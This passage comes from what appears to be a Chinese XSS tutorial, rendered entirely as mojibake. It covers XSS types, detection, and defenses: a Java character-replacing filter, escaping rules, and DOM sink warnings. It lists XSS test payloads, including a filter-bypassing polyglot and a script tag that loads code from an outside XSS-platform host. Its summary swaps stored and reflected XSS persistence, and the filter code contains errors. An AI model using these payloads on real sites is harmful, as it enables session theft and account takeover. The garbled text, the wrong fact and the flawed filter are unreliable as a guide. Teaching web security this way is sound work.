2ã€ç”¨æˆ·æ‰“å¼€å¸¦æœ‰æ¶æ„ä»£ç çš„URLã€‚ 3ã€ç”¨æˆ·æµè§ˆå™¨æŽ¥æ”¶åˆ°å“åº”åŽè§£æžæ‰§è¡Œï¼Œå‰ç«¯JavaScriptå–å‡ºURLä¸­çš„æ¶æ„ä»£ç å¹¶æ‰§è¡Œã€‚ 4ã€æ¶æ„ä»£ç çªƒå–ç”¨æˆ·æ•°æ®å¹¶å‘é€åˆ°æ”»å‡»è€…çš„ç½‘ç«™ï¼Œæˆ–è€…å†’å……ç”¨æˆ·çš„è¡Œä¸ºï¼Œè°ƒç”¨ç›®æ ‡ç½‘ç«™æŽ¥å£æ‰§è¡Œæ”»å‡»è€…æŒ‡å®šçš„æ“ä½œã€‚ DOM åž‹ XSS è·Ÿå‰ä¸¤ç§ XSS çš„åŒºåˆ«ï¼šDOM åž‹ XSS æ”»å‡»ä¸­ï¼Œå–å‡ºå’Œæ‰§è¡Œæ¶æ„ä»£ç ç”±æµè§ˆå™¨ç«¯å®Œæˆï¼Œå±žäºŽå‰ç«¯ JavaScript è‡ªèº«çš„å®‰å…¨æ¼æ´žï¼Œè€Œå…¶ä»–ä¸¤ç§ XSS éƒ½å±žäºŽæœåŠ¡ç«¯çš„å®‰å…¨æ¼æ´žã€‚ç‰¹ç‚¹ï¼š 1ã€æ”»å‡»è„šæœ¬ä¸ä¸ŽæœåŠ¡ç«¯äº¤äº’çš„ï¼Œåªä¸Žå®¢æˆ·ç«¯ä¸Šçš„jsäº¤äº’ï¼Œæ”»å‡»è„šæœ¬æ”¾åˆ°äº†jsä¸­æ‰§è¡Œï¼Œç„¶åŽæ˜¾ç¤ºå‡ºæ¥ï¼› 2ã€DOMåž‹xssä¹Ÿæ˜¯ä¸€ç§åå°„åž‹xssã€‚å°ç»“ åå°„åž‹xssè·Ÿå­˜å‚¨åž‹xssçš„åŒºåˆ«æ˜¯ï¼šå­˜å‚¨åž‹xsséžæŒä¹…æ€§ï¼Œæ”»å‡»è„šæœ¬å­˜åœ¨æœåŠ¡å™¨é‡Œï¼Œåå°„åž‹xssæŒä¹…æ€§ï¼Œæ”»å‡»è„šæœ¬å­˜åœ¨URLé‡Œã€‚ DOMåž‹xssè·Ÿå‰ä¸¤ç§xssçš„åŒºåˆ«ï¼šDOMåž‹xssï¼Œæ˜¯é€šè¿‡ä¿®æ”¹é¡µé¢çš„DOMèŠ‚ç‚¹æ¥å½¢æˆxssçš„ï¼Œå–å‡ºå’Œæ‰§è¡Œæ¶æ„ä»£ç ç”±æµè§ˆå™¨ç«¯å®Œæˆï¼Œå±žäºŽå‰ç«¯JavaScriptè‡ªèº«çš„å®‰å…¨æ¼æ´žï¼Œè€Œå…¶ä»–ä¸¤ç§xsséƒ½å±žäºŽæœåŠ¡ç«¯çš„å®‰å…¨æ¼æ´žã€‚ç±»åž‹å­˜å‚¨åŒºæ’å…¥ç‚¹å­˜å‚¨åž‹ XSSåŽç«¯æ•°æ®åº“HTMLåå°„åž‹ XSSURLHTMLDOMåž‹ XSSåŽç«¯æ•°æ®åº“/å‰ç«¯å­˜å‚¨/URLå‰ç«¯ JavaScriptXSSæ¼æ´žçš„æ£€æµ‹xssæŽ¢é’ˆ xssæŽ¢é’ˆå¯æ£€æµ‹å‡ºç½‘ç«™æœ‰æ²¡æœ‰å¯¹xssæ¼æ´žåšæœ€åŸºç¡€çš„é˜²å¾¡ã€‚ åœ¨æµ‹è¯•xssçš„ä½ç½®å†™å…¥ä»£ç ï¼ŒæŸ¥çœ‹é¡µé¢æºç ï¼Œçœ‹çœ‹å“ªäº›ä»£ç è¢«è¿‡æ»¤æˆ–è€…è½¬ä¹‰äº†ã€‚1'';!--"&lt;XSS&gt;=&amp;&#123;()&#125;xssè¯­å¥ é™¤äº†xssæŽ¢é’ˆä»¥å¤–ï¼Œè¿˜å¯ä»¥è¾“å…¥æœ€ç®€å•çš„æµ‹è¯•è¯­å¥1&lt;script&gt;alert(/xss/)&lt;/script&gt; å¦‚æžœæ’å…¥çš„è¯­å¥åŽŸå°ä¸åŠ¨çš„å‘ˆçŽ°åœ¨äº†æµè§ˆå™¨ä¸­ï¼Œé‚£ä¹ˆè¯´æ˜Žï¼šä»£ç æ²¡æœ‰è¢«è¿‡æ»¤ï¼Œå­˜åœ¨xssï¼›ä»£ç æ²¡æœ‰è¢«æ‰§è¡Œï¼Œå› ä¸ºæ²¡æœ‰é—­åˆç±»ä¼¼textareaæ ‡ç­¾ï¼Œå¯ä»¥æŸ¥çœ‹ä¸‹æºç ã€‚å¸¸ç”¨çš„xssæ£€æµ‹è¯­å¥12345678910111213141516&lt;script&gt;alert(/xss/);&lt;/script&gt;&lt;script&gt;alert(/xss/)//&lt;script&gt;alert("xss");;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;&lt;/script&gt;//ç”¨åˆ†å·ï¼Œä¹Ÿå¯ä»¥åˆ†å·+ç©ºæ ¼ï¼ˆå›žè½¦ä¸€èµ·ä½¿ç”¨ï¼‰&lt;img src=1 onmouseover=alert(1)&gt;&lt;a herf=1 onload=alert(1)&gt;nmask&lt;/a&gt;&lt;script&gt;window.a==1?1:prompt(a=1)&lt;/script&gt;&lt;script&gt;a=prompt;a(1)&lt;/script&gt;&lt;img src=0 onerror=confirm('1')&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;script src="http://xsspt.com/vA4t1W?1542101296"&gt;&lt;/script&gt;&lt;img src=x onerror=alert(1)&gt;&lt;a href="javascript:alert(1)"&gt;xss&lt;/a&gt;&lt;svg onload=alert(1)&gt;&lt;input type="text" name="test" onclick=alert(1)&gt;&lt;iframe src="javascript:alert(/xss/)"&gt;xss&lt;/iframe&gt;&lt;iframe srcdoc="&lt;script&gt;alert&amp;#40;1&amp;#41;&lt;/script&gt;"&gt;ä½¿ç”¨GIthubä¸Šçš„ç»ˆæžxsså·¥å…·ðŸ‘‰ä¼ é€é—¨1jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=alert()//&gt;\x3e å®ƒèƒ½å¤Ÿæ£€æµ‹åˆ°å­˜åœ¨äºŽHTMLå±žæ€§ã€HTMLæ–‡å­—å†…å®¹ã€HTMLæ³¨é‡Šã€è·³è½¬é“¾æŽ¥ã€å†…è”JavaScriptå­—ç¬¦ä¸²ã€å†…è”CSS æ ·å¼è¡¨ç­‰å¤šç§ä¸Šä¸‹æ–‡ä¸­çš„XSSæ¼æ´žï¼Œä¹Ÿèƒ½æ£€æµ‹ eval()ã€setTimeout()ã€setInterval()ã€Function()ã€innerHTMLã€document.write()ç­‰DOMXSSæ¼æ´žï¼Œå¹¶ä¸”èƒ½ç»•è¿‡ä¸€äº›XSSè¿‡æ»¤å™¨ã€‚ åªè¦åœ¨ç½‘ç«™çš„å„è¾“å…¥æ¡†ä¸­æäº¤è¿™ä¸ªå­—ç¬¦ä¸²ï¼Œæˆ–è€…æŠŠå®ƒæ‹¼æŽ¥åˆ°URLå‚æ•°ä¸Šï¼Œå°±å¯ä»¥è¿›è¡Œæ£€æµ‹äº†ã€‚è‡ªåŠ¨åŒ–æ‰«æå·¥å…· é™¤äº†æ‰‹åŠ¨æ£€æµ‹ä¹‹å¤–ï¼Œè¿˜å¯ä»¥ä½¿ç”¨è‡ªåŠ¨æ‰«æå·¥å…·å¯»æ‰¾xssæ¼æ´žï¼Œä¾‹å¦‚ Arachniã€Mozilla HTTP Observatoryã€w3af ç­‰ã€‚XSSäº§ç”Ÿçš„åŽŸå›  xsså­˜åœ¨çš„æ ¹æœ¬åŽŸå› æ˜¯ï¼Œå¯¹URLä¸­çš„å‚æ•°ï¼Œå¯¹ç”¨æˆ·è¾“å…¥æäº¤ç»™web serverçš„å†…å®¹ï¼Œæ²¡æœ‰è¿›è¡Œå……åˆ†çš„è¿‡æ»¤ã€‚å¦‚æžœæˆ‘ä»¬èƒ½å¤Ÿåœ¨webç¨‹åºä¸­ï¼Œå¯¹ç”¨æˆ·æäº¤çš„URLä¸­çš„å‚æ•°ï¼Œå’Œæäº¤çš„æ‰€æœ‰å†…å®¹ï¼Œè¿›è¡Œå……åˆ†çš„è¿‡æ»¤ï¼Œå°†æ‰€æœ‰çš„ä¸åˆæ³•çš„å‚æ•°å’Œè¾“å…¥å†…å®¹è¿‡æ»¤æŽ‰ï¼Œé‚£ä¹ˆå°±ä¸ä¼šå¯¼è‡´åœ¨ç”¨æˆ·çš„æµè§ˆå™¨ä¸­æ‰§è¡Œæ”»å‡»è€…è‡ªå·±å®šåˆ¶çš„è„šæœ¬ã€‚ ä½†æ˜¯ï¼Œå…¶å®žå……åˆ†è€Œå®Œå…¨çš„è¿‡æ»¤ï¼Œå®žé™…ä¸Šæ˜¯æ— æ³•å®žçŽ°çš„ã€‚å› ä¸ºæ”»å‡»è€…æœ‰å„ç§å„æ ·çš„ç¥žå¥‡çš„ï¼Œä½ å®Œå…¨æƒ³è±¡ä¸åˆ°çš„æ–¹å¼æ¥ç»•è¿‡æœåŠ¡å™¨ç«¯çš„è¿‡æ»¤ï¼Œæœ€å…¸åž‹çš„å°±æ˜¯å¯¹URLå’Œå‚æ•°è¿›è¡Œå„ç§çš„ç¼–ç ï¼Œæ¯”å¦‚escapeï¼ŒencodeURIï¼ŒencodeURIComponentï¼Œ8è¿›åˆ¶ï¼Œ10è¿›åˆ¶ï¼Œ16è¿›åˆ¶ï¼Œæ¥ç»•è¿‡xssè¿‡æ»¤ã€‚é‚£ä¹ˆæˆ‘ä»¬å¦‚ä½•æ¥é˜²å¾¡xsså‘¢ï¼ŸXSSæ”»å‡»çš„é˜²å¾¡XSS æ”»å‡»æœ‰ä¸¤å¤§è¦ç´ ï¼š1ã€æ”»å‡»è€…æäº¤æ¶æ„ä»£ç ã€‚2ã€æµè§ˆå™¨æ‰§è¡Œæ¶æ„ä»£ç ã€‚ æ¯”è¾ƒå¸¸è§„çš„æ€è·¯æ˜¯ï¼šå¯¹è¾“å…¥å’ŒURLå‚æ•°è¿›è¡Œè¿‡æ»¤ï¼Œå¯¹è¾“å‡ºè¿›è¡Œç¼–ç ã€‚ä¹Ÿå°±æ˜¯å¯¹æäº¤çš„æ‰€æœ‰å†…å®¹è¿›è¡Œè¿‡æ»¤ï¼Œå¯¹urlä¸­çš„å‚æ•°è¿›è¡Œè¿‡æ»¤ï¼Œè¿‡æ»¤æŽ‰ä¼šå¯¼è‡´è„šæœ¬æ‰§è¡Œçš„ç›¸å…³å†…å®¹ã€‚ç„¶åŽå¯¹åŠ¨æ€è¾“å‡ºåˆ°é¡µé¢çš„å†…å®¹è¿›è¡Œhtmlç¼–ç ï¼Œä½¿è„šæœ¬æ— æ³•åœ¨æµè§ˆå™¨ä¸­æ‰§è¡Œã€‚è™½ç„¶å¯¹è¾“å…¥è¿‡æ»¤å¯ä»¥è¢«ç»•è¿‡ï¼Œä½†æ˜¯ä¹Ÿè¿˜æ˜¯ä¼šæ‹¦æˆªå¾ˆå¤§ä¸€éƒ¨åˆ†çš„xssæ”»å‡»ã€‚XSS filterå¯¹è¾“å…¥å’ŒURLå‚æ•°è¿›è¡Œè¿‡æ»¤ï¼ˆé»‘ç™½åå•ï¼‰ï¼Œå¸¸ç”¨çš„xss filterçš„å®žçŽ°ä»£ç ï¼š123456789101112public class XssFilter implements Filter &#123; public void init(FilterConfig config) throws ServletException &#123;&#125; public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException &#123; XssHttpServletRequestWrapper xssRequest = new XssHttpServletRequestWrapper((HttpServletRequest)request); chain.doFilter(xssRequest, response); &#125; public void destroy() &#123;&#125;&#125;123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119public class XssHttpServletRequestWrapper extends HttpServletRequestWrapper &#123; HttpServletRequest orgRequest = null; public XssHttpServletRequestWrapper(HttpServletRequest request) &#123; super(request); orgRequest = request; &#125; /** * è¦†ç›–getParameteræ–¹æ³•ï¼Œå°†å‚æ•°åå’Œå‚æ•°å€¼éƒ½åšxssè¿‡æ»¤ã€‚&lt;br/&gt; * å¦‚æžœéœ€è¦èŽ·å¾—åŽŸå§‹çš„å€¼ï¼Œåˆ™é€šè¿‡super.getParameterValues(name)æ¥èŽ·å–&lt;br/&gt; * getParameterNames,getParameterValueså’ŒgetParameterMapä¹Ÿå¯èƒ½éœ€è¦è¦†ç›– */ @Override public String getParameter(String name) &#123; String value = super.getParameter(xssEncode(name)); if (value != null) &#123; value = xssEncode(value); &#125; return value; &#125; /** * è¦†ç›–getHeaderæ–¹æ³•ï¼Œå°†å‚æ•°åå’Œå‚æ•°å€¼éƒ½åšxssè¿‡æ»¤ã€‚&lt;br/&gt; * å¦‚æžœéœ€è¦èŽ·å¾—åŽŸå§‹çš„å€¼ï¼Œåˆ™é€šè¿‡super.getHeaders(name)æ¥èŽ·å–&lt;br/&gt; * getHeaderNames ä¹Ÿå¯èƒ½éœ€è¦è¦†ç›– */ @Override public String getHeader(String name) &#123; String value = super.getHeader(xssEncode(name)); if (value != null) &#123; value = xssEncode(value); &#125; return value; &#125; /** * å°†å®¹æ˜“å¼•èµ·xssæ¼æ´žçš„åŠè§’å­—ç¬¦ç›´æŽ¥æ›¿æ¢æˆå…¨è§’å­—ç¬¦ * * @param s * @return */ private static String xssEncode(String s) &#123; if (s == null || s.isEmpty()) &#123; return s; &#125; StringBuilder sb = new StringBuilder(s.length() + 16); for (int i = 0; i &lt; s.length(); i++) &#123; char c = s.charAt(i); switch (c) &#123; case '&gt;': sb.append('ï¼ž');// å…¨è§’å¤§äºŽå· break; case '&lt;': sb.append('ï¼œ');// å…¨è§’å°äºŽå· break; case '\'': sb.append('â€˜');// å…¨è§’å•å¼•å· break; case '\"': sb.append('â€œ');// å…¨è§’åŒå¼•å· break; case '&amp;': sb.append('ï¼†');// å…¨è§’ break; case '\\': sb.append('ï¼¼');// å…¨è§’æ–œçº¿ break; case '#': sb.append('ï¼ƒ');// å…¨è§’äº•å· break; case '%': // &lt; å­—ç¬¦çš„ URL ç¼–ç å½¢å¼è¡¨ç¤ºçš„ ASCII å­—ç¬¦ï¼ˆåå…­è¿›åˆ¶æ ¼å¼ï¼‰ æ˜¯: %3c processUrlEncoder(sb, s, i); break; default: sb.append(c); break; &#125; &#125; return sb.toString(); &#125; public static void processUrlEncoder(StringBuilder sb, String s, int index)&#123; if(s.length() &gt;= index + 2)&#123; if(s.charAt(index+1) == '3' &amp;&amp; (s.charAt(index+2) == 'c' || s.charAt(index+2) == 'C'))&#123; // %3c, %3C sb.append('ï¼œ'); return; &#125; if(s.charAt(index+1) == '6' &amp;&amp; s.charAt(index+2) == '0')&#123; // %3c (0x3c=60) sb.append('ï¼œ'); return; &#125; if(s.charAt(index+1) == '3' &amp;&amp; (s.charAt(index+2) == 'e' || s.charAt(index+2) == 'E'))&#123; // %3e, %3E sb.append('ï¼ž'); return; &#125; if(s.charAt(index+1) == '6' &amp;&amp; s.charAt(index+2) == '2')&#123; // %3e (0x3e=62) sb.append('ï¼ž'); return; &#125; &#125; sb.append(s.charAt(index)); &#125; /** * èŽ·å–æœ€åŽŸå§‹çš„request * * @return */ public HttpServletRequest getOrgRequest() &#123; return orgRequest; &#125; /** * èŽ·å–æœ€åŽŸå§‹çš„requestçš„é™æ€æ–¹æ³• * * @return */ public static HttpServletRequest getOrgRequest(HttpServletRequest req) &#123; if (req instanceof XssHttpServletRequestWrapper) &#123; return ((XssHttpServletRequestWrapper) req).getOrgRequest(); &#125; return req; &#125;&#125;ç„¶åŽåœ¨web.xmlä¸­é…ç½®è¯¥filterï¼š12345678&lt;filter&gt; &lt;filter-name&gt;xssFilter&lt;/filter-name&gt; &lt;filter-class&gt;com.xxxxxx.filter.XssFilter&lt;/filter-class&gt; &lt;/filter&gt; &lt;filter-mapping&gt; &lt;filter-name&gt;xssFilter&lt;/filter-name&gt; &lt;url-pattern&gt;/*&lt;/url-pattern&gt; &lt;/filter-mapping&gt; ä¸»è¦çš„æ€è·¯å°±æ˜¯å°†å®¹æ˜“å¯¼è‡´XSSæ”»å‡»çš„è¾¹è§’å­—ç¬¦æ›¿æ¢æˆå…¨è§’å­—ç¬¦ã€‚&lt;å’Œ&gt;æ˜¯è„šæœ¬æ‰§è¡Œå’Œå„ç§htmlæ ‡ç­¾éœ€è¦çš„ï¼Œæ¯”å¦‚ &lt;script&gt;ï¼Œ&amp;å’Œ #ä»¥åŠ %åœ¨å¯¹URLç¼–ç è¯•å›¾ç»•è¿‡xss filteræ—¶ï¼Œä¼šå‡ºçŽ°ã€‚æˆ‘ä»¬è¯´å¯¹è¾“å…¥çš„è¿‡æ»¤åˆ†ä¸ºç™½åå•å’Œé»‘åå•ã€‚ä¸Šé¢çš„xss filterå°±æ˜¯ä¸€ç§é»‘åå•çš„è¿‡æ»¤ï¼Œé»‘åå•å°±æ˜¯åˆ—å‡ºä¸èƒ½å‡ºçŽ°çš„å¯¹è±¡çš„æ¸…å•ï¼Œä¸€æ—¦å‡ºçŽ°å°±è¿›è¡Œå¤„ç†ã€‚è¿˜æœ‰ä¸€ç§ç™½åå•çš„è¿‡æ»¤ï¼Œç™½åå•å°±æ˜¯åˆ—å‡ºå¯è¢«æŽ¥å—çš„å†…å®¹ï¼Œæ¯”å¦‚è§„å®šæ‰€æœ‰çš„è¾“å…¥åªèƒ½æ˜¯å¤§å°å†™çš„26ä¸ªè‹±æ–‡å­—æ¯å’Œ10ä¸ªæ•°å­—ï¼Œè¿˜æœ‰-å’Œ_ï¼Œæ‰€æœ‰å…¶ä»–çš„è¾“å…¥éƒ½æ˜¯éžæ³•çš„ï¼Œä¼šè¢«æŠ›å¼ƒæŽ‰ã€‚å¾ˆæ˜¾ç„¶å¦‚æ­¤ä¸¥æ ¼çš„ç™½åå•æ˜¯å¯ä»¥100%æ‹¦æˆªæ‰€æœ‰çš„xssæ”»å‡»çš„ï¼Œä½†æ˜¯çŽ°å®žæƒ…å†µä¸€èˆ¬æ˜¯ä¸èƒ½è¿›è¡Œå¦‚æ­¤ä¸¥æ ¼çš„ç™½åå•è¿‡æ»¤çš„ã€‚ å¯¹äºŽè¾“å…¥ï¼Œå¤„ç†ä½¿ç”¨xss filterä¹‹å¤–ï¼Œå¯¹äºŽæ¯ä¸€ä¸ªè¾“å…¥ï¼Œåœ¨å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ç«¯è¿˜è¦è¿›è¡Œå„ç§éªŒè¯ï¼ŒéªŒè¯æ˜¯å¦åˆæ³•å­—ç¬¦ï¼Œé•¿åº¦æ˜¯å¦åˆæ³•ï¼Œæ ¼å¼æ˜¯å¦æ­£ç¡®ã€‚åœ¨å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯éƒ½è¦è¿›è¡ŒéªŒè¯ï¼Œå› ä¸ºå®¢æˆ·ç«¯çš„éªŒè¯å¾ˆå®¹æ˜“è¢«ç»•è¿‡ã€‚å…¶å®žè¿™ç§éªŒè¯ä¹Ÿåˆ†ä¸ºäº†é»‘åå•å’Œç™½åå•ã€‚é»‘åå•çš„éªŒè¯å°±æ˜¯ä¸èƒ½å‡ºçŽ°æŸäº›å­—ç¬¦ï¼Œç™½åå•çš„éªŒè¯å°±æ˜¯åªèƒ½å‡ºçŽ°æŸäº›å­—ç¬¦ã€‚å°½é‡ä½¿ç”¨ç™½åå•ï¼Œè™½ç„¶ç™½åå•æ— æ³•å®Œå…¨æœç»xssï¼Œä½†æ˜¯ä½¿ç”¨ä¸å½“çš„è¯å¯èƒ½ä¼šå¸¦æ¥å¾ˆé«˜çš„è¯¯æŠ¥çŽ‡ã€‚å­˜å‚¨åž‹å’Œåå°„åž‹XSSæ”»å‡»çš„é˜²å¾¡ å­˜å‚¨åž‹å’Œåå°„åž‹xsséƒ½æ˜¯åœ¨æœåŠ¡ç«¯å–å‡ºæ¶æ„ä»£ç åŽï¼Œæ’å…¥åˆ°å“åº”HTMLé‡Œçš„ï¼Œæ”»å‡»è€…åˆ»æ„ç¼–å†™çš„â€œæ•°æ®â€è¢«å†…åµŒåˆ°â€œä»£ç â€ä¸­ï¼Œè¢«æµè§ˆå™¨æ‰€æ‰§è¡Œã€‚é¢„é˜²è¿™ä¸¤ç§æ¼æ´žï¼Œæœ‰ä¸¤ç§å¸¸è§åšæ³•ï¼šæ”¹æˆçº¯å‰ç«¯æ¸²æŸ“ï¼ŒæŠŠä»£ç å’Œæ•°æ®åˆ†éš”å¼€ã€‚çº¯å‰ç«¯æ¸²æŸ“çš„è¿‡ç¨‹ï¼š1ã€æµè§ˆå™¨å…ˆåŠ è½½ä¸€ä¸ªé™æ€HTMLï¼Œæ­¤HTMLä¸­ä¸åŒ…å«ä»»ä½•è·Ÿä¸šåŠ¡ç›¸å…³çš„æ•°æ®ã€‚2ã€ç„¶åŽæµè§ˆå™¨æ‰§è¡ŒHTMLä¸­çš„JavaScriptã€‚3ã€JavaScripté€šè¿‡AjaxåŠ è½½ä¸šåŠ¡æ•°æ®ï¼Œè°ƒç”¨DOM APIæ›´æ–°åˆ°é¡µé¢ä¸Šã€‚ åœ¨çº¯å‰ç«¯æ¸²æŸ“ä¸­ï¼Œæˆ‘ä»¬ä¼šæ˜Žç¡®çš„å‘Šè¯‰æµè§ˆå™¨ï¼šä¸‹é¢è¦è®¾ç½®çš„å†…å®¹æ˜¯æ–‡æœ¬.innerTextï¼Œè¿˜æ˜¯å±žæ€§.setAttributeï¼Œè¿˜æ˜¯æ ·å¼.styleç­‰ç­‰ã€‚æµè§ˆå™¨ä¸ä¼šè¢«è½»æ˜“çš„è¢«æ¬ºéª—ï¼Œæ‰§è¡Œé¢„æœŸå¤–çš„ä»£ç äº†ã€‚ ä½†çº¯å‰ç«¯æ¸²æŸ“è¿˜éœ€æ³¨æ„é¿å…DOMåž‹xssæ¼æ´žï¼Œä¾‹å¦‚ onload äº‹ä»¶å’Œ href ä¸­çš„ javascript:xxx ç­‰ã€‚åœ¨å¾ˆå¤šå†…éƒ¨ã€ç®¡ç†ç³»ç»Ÿä¸­ï¼Œé‡‡ç”¨çº¯å‰ç«¯æ¸²æŸ“æ˜¯éžå¸¸åˆé€‚çš„ã€‚ä½†å¯¹äºŽæ€§èƒ½è¦æ±‚é«˜ï¼Œæˆ–æœ‰ SEO éœ€æ±‚çš„é¡µé¢ï¼Œæˆ‘ä»¬ä»ç„¶è¦é¢å¯¹æ‹¼æŽ¥HTMLçš„é—®é¢˜ã€‚å¯¹HTMLåšå……åˆ†è½¬ä¹‰ã€‚ å¦‚æžœæ‹¼æŽ¥HTMLæ˜¯å¿…è¦çš„ï¼Œå°±éœ€è¦é‡‡ç”¨åˆé€‚çš„è½¬ä¹‰åº“ï¼Œå¯¹HTMLæ¨¡æ¿å„å¤„æ’å…¥ç‚¹è¿›è¡Œå……åˆ†çš„è½¬ä¹‰ã€‚ å¯¹äºŽHTMLè½¬ä¹‰é€šå¸¸åªæœ‰ä¸€ä¸ªè§„åˆ™ï¼Œå°±æ˜¯æŠŠ &amp; &lt; &gt; &quot; &#39; / è¿™å‡ ä¸ªå­—ç¬¦è½¬ä¹‰æŽ‰ï¼Œç¡®å®žèƒ½èµ·åˆ°ä¸€å®šçš„xssé˜²æŠ¤ä½œç”¨ï¼Œä½†å¹¶ä¸å®Œå–„ã€‚è¦å®Œå–„xssé˜²æŠ¤æŽªæ–½ï¼Œè¦ä½¿ç”¨æ›´å®Œå–„æ›´ç»†è‡´çš„è½¬ä¹‰ç­–ç•¥ã€‚ä¾‹å¦‚Javaå·¥ç¨‹é‡Œï¼Œå¸¸ç”¨çš„è½¬ä¹‰åº“ä¸º org.owasp.encoderã€‚XSS å®‰å…¨æ¼æ´žç®€å•è½¬ä¹‰æ˜¯å¦æœ‰é˜²æŠ¤ä½œç”¨HTML æ ‡ç­¾æ–‡å­—å†…å®¹æœ‰HTML å±žæ€§å€¼æœ‰CSS å†…è”æ ·å¼æ— å†…è” JavaScriptæ— å†…è” JSONæ— è·³è½¬é“¾æŽ¥æ—  åœ¨è¾“å‡ºæ•°æ®ä¹‹å‰å¯¹æ½œåœ¨çš„å¨èƒçš„å­—ç¬¦è¿›è¡Œç¼–ç ã€è½¬ä¹‰å¯¹xssæ”»å‡»èƒ½èµ·åˆ°ä¸€å®šçš„é˜²å¾¡ä½œç”¨ã€‚ å¯¹æ‰€æœ‰è¦åŠ¨æ€è¾“å‡ºåˆ°é¡µé¢çš„å†…å®¹ï¼Œé€šé€šè¿›è¡Œç›¸å…³çš„ç¼–ç å’Œè½¬ä¹‰ã€‚å½“ç„¶è½¬ä¹‰æ˜¯æŒ‰ç…§å…¶è¾“å‡ºçš„ä¸Šä¸‹æ–‡çŽ¯å¢ƒæ¥å†³å®šå¦‚ä½•è½¬ä¹‰çš„ã€‚ä½œä¸ºbodyæ–‡æœ¬è¾“å‡ºï¼Œhtmlæ ‡ç­¾çš„å±žæ€§è¾“å‡ºï¼Œæ¯”å¦‚ï¼š123&lt;span&gt;$&#123;username&#125;&lt;/span&gt;&lt;p&gt;&lt;c:out value="$&#123;username&#125;"&gt;&lt;/c:out&gt;&lt;/p&gt;&lt;input type="text" value="$&#123;username&#125;" /&gt;æ­¤æ—¶çš„è½¬ä¹‰è§„åˆ™å¦‚ä¸‹ï¼š&lt;è½¬æˆ &amp;lt; &gt;è½¬æˆ &amp;gt; &amp; è½¬æˆ &amp;amp; &quot;è½¬æˆ &amp;quot;&#39;è½¬æˆ &amp;#39 \è½¬æˆ\\ /è½¬æˆ \/ ;è½¬æˆ ï¼›(å…¨è§’;)javascriptäº‹ä»¶1&lt;input type="button" Î¿nclick='go_to_url("$&#123;myUrl&#125;");' /&gt;URLå±žæ€§ å¦‚æžœ &lt;script&gt;ã€&lt;style&gt;ã€&lt;imt&gt;ç­‰æ ‡ç­¾çš„ src å’Œ href å±žæ€§å€¼ä¸ºåŠ¨æ€å†…å®¹ï¼Œé‚£ä¹ˆè¦ç¡®ä¿è¿™äº›URLæ²¡æœ‰æ‰§è¡Œæ¶æ„è¿žæŽ¥ã€‚ç¡®ä¿ï¼šhrefå’Œ srcçš„å€¼å¿…é¡»ä»¥ http://å¼€å¤´ï¼Œç™½åå•æ–¹å¼ï¼›ä¸èƒ½æœ‰10è¿›åˆ¶å’Œ16è¿›åˆ¶ç¼–ç å­—ç¬¦ã€‚DOMåž‹XSSæ”»å‡»çš„é˜²å¾¡ DOMåž‹xssæ”»å‡»ï¼Œå®žé™…ä¸Šå°±æ˜¯ç½‘ç«™å‰ç«¯JavaScriptä»£ç æœ¬èº«ä¸å¤Ÿä¸¥è°¨ï¼ŒæŠŠä¸å¯ä¿¡çš„æ•°æ®å½“ä½œä»£ç æ‰§è¡Œäº†ã€‚ åœ¨ä½¿ç”¨ .innerHTMLã€.outerHTMLã€document.write() æ—¶è¦ç‰¹åˆ«å°å¿ƒï¼Œä¸è¦æŠŠä¸å¯ä¿¡çš„æ•°æ®ä½œä¸ºHTMLæ’åˆ°é¡µé¢ä¸Šï¼Œè€Œåº”å°½é‡ä½¿ç”¨ .textContentã€.setAttribute() ç­‰ã€‚ å¦‚æžœç”¨Vue/ReactæŠ€æœ¯æ ˆï¼Œå¹¶ä¸”ä¸ä½¿ç”¨ v-html/dangerouslySetInnerHTML åŠŸèƒ½ï¼Œå°±åœ¨å‰ç«¯renderé˜¶æ®µé¿å… innerHTMLã€outerHTML çš„xsséšæ‚£ã€‚ DOMä¸­çš„å†…è”äº‹ä»¶ç›‘å¬å™¨ï¼Œå¦‚ locationã€onclickã€onerrorã€onloadã€onmouseover ç­‰ï¼Œ&lt;a&gt; æ ‡ç­¾çš„ href å±žæ€§ï¼ŒJavaScriptçš„ eval()ã€setTimeout()ã€setInterval()ç­‰ï¼Œéƒ½èƒ½æŠŠå­—ç¬¦ä¸²ä½œä¸ºä»£ç è¿è¡Œã€‚å¦‚æžœä¸å¯ä¿¡çš„æ•°æ®æ‹¼æŽ¥åˆ°å­—ç¬¦ä¸²ä¸­ä¼ é€’ç»™è¿™äº›APIï¼Œå¾ˆå®¹æ˜“äº§ç”Ÿå®‰å…¨éšæ‚£ï¼Œè¯·åŠ¡å¿…é¿å…ã€‚12345678910111213&lt;!-- å†…è”äº‹ä»¶ç›‘å¬å™¨ä¸­åŒ…å«æ¶æ„ä»£ç  --&gt; &lt; img onclick = "UNTRUSTED" onerror = "UNTRUSTED" src = "data:image/png," &gt; &lt;!-- é“¾æŽ¥å†…åŒ…å«æ¶æ„ä»£ç  --&gt; &lt; a href = "UNTRUSTED" &gt; 1 &lt;/ a &gt; &lt; script &gt; // setTimeout()/setInterval() ä¸­è°ƒç”¨æ¶æ„ä»£ç  setTimeout( "UNTRUSTED" )setInterval( "UNTRUSTED" ) // location è°ƒç”¨æ¶æ„ä»£ç  location.href = 'UNTRUSTED' // eval() ä¸­è°ƒç”¨æ¶æ„ä»£ç  eval ( "UNTRUSTED" ) &lt;/ script &gt;å…¶ä»–xssæ”»å‡»çš„é˜²å¾¡HttpOnly xssä¸€èˆ¬åˆ©ç”¨jsè„šæœ¬è¯»å–ç”¨æˆ·æµè§ˆå™¨ä¸­çš„Cookieï¼Œè€Œå¦‚æžœåœ¨æœåŠ¡å™¨ç«¯å¯¹ Cookie è®¾ç½®äº†HttpOnly å±žæ€§ï¼Œé‚£ä¹ˆjsè„šæœ¬å°†æ— 